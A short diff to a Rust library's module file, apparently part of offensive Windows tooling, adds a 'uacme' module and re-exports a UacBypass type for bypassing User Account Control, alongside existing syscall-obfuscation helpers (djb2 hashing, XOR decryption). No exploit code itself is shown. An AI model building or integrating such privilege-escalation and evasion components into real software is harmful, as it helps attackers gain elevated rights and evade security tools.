@@ -16,6 +16,10 @@
 
 pub mod pe;
 pub mod syscalls;
+pub mod uacme;
 
 // Re-export des macros importantes pour usage externe
 pub use syscalls::obf::{djb2_hash, djb2_hash_str, xor_decrypt, XOR_KEY};
+
+// Re-export du module UACME pour le bypass UAC
+pub use uacme::{UacBypass, UacResult, ShowWindow};
